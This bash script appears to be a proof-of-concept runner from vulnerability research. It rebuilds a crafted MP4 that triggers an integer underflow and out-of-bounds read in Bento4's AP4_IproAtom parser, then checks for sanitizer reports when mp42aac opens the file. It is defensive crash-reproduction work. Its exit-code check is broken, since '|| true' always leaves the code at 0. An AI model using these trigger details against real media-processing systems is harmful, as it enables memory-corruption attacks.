#!/usr/bin/env bash
# PoC runner for VULN 001: Integer Underflow in AP4_IproAtom → OOB Read
# Target: /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="$POC_DIR/vuln_001.mp4"
RESULT="$POC_DIR/vuln_001_result.txt"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"

echo "=== VULN 001 PoC Runner ===" | tee "$RESULT"
echo "Target: $BINARY" | tee -a "$RESULT"
echo "Input:  $INPUT" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 1: Generate the crafted MP4 file
echo "[*] Generating crafted MP4..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_001_gen.py" 2>&1 | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 2: Verify the input was generated
if [ ! -f "$INPUT" ]; then
    echo "[!] ERROR: Input file not generated: $INPUT" | tee -a "$RESULT"
    echo "ERROR" > "$POC_DIR/vuln_001_status.txt"
    exit 1
fi
echo "[*] Input file: $(ls -la "$INPUT")" | tee -a "$RESULT"
echo "[*] File hex dump:" | tee -a "$RESULT"
xxd "$INPUT" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 3: Remove old ASAN log files
rm -f "${ASAN_LOG_PREFIX}".*

# Step 4: Run mp42aac with ASAN/UBSAN options
echo "[*] Running mp42aac with ASAN+UBSAN..." | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
    "$BINARY" \
    "$INPUT" \
    /dev/null \
    >> "$RESULT" 2>&1 || true

EXITCODE=$?
echo "" | tee -a "$RESULT"
echo "[*] Exit code: $EXITCODE" | tee -a "$RESULT"

# Step 5: Check for ASAN/UBSAN output in log files
echo "[*] Checking for ASAN/UBSAN error logs..." | tee -a "$RESULT"
FOUND_ASAN=0
for logfile in "${ASAN_LOG_PREFIX}".*; do
    if [ -f "$logfile" ]; then
        LOGSIZE=$(wc -c < "$logfile")
        echo "[*] ASAN log found: $logfile (${LOGSIZE} bytes)" | tee -a "$RESULT"
        if [ "$LOGSIZE" -gt 0 ]; then
            cat "$logfile" | tee -a "$RESULT"
            FOUND_ASAN=1
        fi
    fi
done

if [ "$FOUND_ASAN" -eq 0 ]; then
    echo "[*] No ASAN log files found (or all empty) at ${ASAN_LOG_PREFIX}.*" | tee -a "$RESULT"
fi

# Step 6: Check for real ASAN/UBSAN/crash indicators in output
# Note: "ERROR: no audio track found" is a normal mp42aac message, NOT an ASAN error.
# ASAN errors look like: ==PID==ERROR: AddressSanitizer: ...
# UBSAN errors look like: file.cpp:N: runtime error: ...
echo "" | tee -a "$RESULT"
echo "[*] Checking for sanitizer/crash indicators..." | tee -a "$RESULT"

STATUS="UNVERIFIED"

if [ "$FOUND_ASAN" -eq 1 ]; then
    echo "[!] ASAN log file(s) found with content — sanitizer event detected!" | tee -a "$RESULT"
    STATUS="VERIFIED_CRASH"
elif grep -qE "==[0-9]+==ERROR: (AddressSanitizer|UndefinedBehaviorSanitizer)" "$RESULT" 2>/dev/null; then
    echo "[!] AddressSanitizer / UndefinedBehaviorSanitizer error detected in output!" | tee -a "$RESULT"
    STATUS="VERIFIED_CRASH"
elif grep -qE "runtime error:" "$RESULT" 2>/dev/null; then
    echo "[!] UBSAN runtime error detected in output!" | tee -a "$RESULT"
    STATUS="VERIFIED_CRASH"
elif grep -qE "SUMMARY: (AddressSanitizer|MemorySanitizer)" "$RESULT" 2>/dev/null; then
    echo "[!] Sanitizer SUMMARY line detected!" | tee -a "$RESULT"
    STATUS="VERIFIED_CRASH"
elif [ "$EXITCODE" -ne 0 ] && [ "$EXITCODE" -ne 1 ] && [ "$EXITCODE" -ne 2 ]; then
    echo "[!] Non-zero exit code ($EXITCODE) — possible crash (SIGABRT/SIGSEGV/etc.)" | tee -a "$RESULT"
    STATUS="VERIFIED_CRASH"
else
    echo "[*] No ASAN/UBSAN/crash indicator detected. The logical OOB occurred but" | tee -a "$RESULT"
    echo "    was not caught by the memory sanitizer (file-backed stream uses fread," | tee -a "$RESULT"
    echo "    which does not expose memory pointers that ASAN can track)." | tee -a "$RESULT"
fi

echo "" | tee -a "$RESULT"
echo "=== STATUS: $STATUS ===" | tee -a "$RESULT"

# Write status file
{
    echo "$STATUS"
    echo "Vuln: Integer underflow in AP4_IproAtom (bytes_available = 12-12-2 = 0xFFFFFFFE)"
    echo "Trigger: ipro.size=12 passes guard (12<12 is false), OOB ReadUI16 + CreateAtomFromStream"
    echo "Exit code: $EXITCODE"
    echo "ASAN logs: $FOUND_ASAN"
} > "$POC_DIR/vuln_001_status.txt"

echo "" | tee -a "$RESULT"
echo "[*] Results written to: $RESULT"
echo "[*] Status file: $POC_DIR/vuln_001_status.txt"
echo "[*] Status: $STATUS"
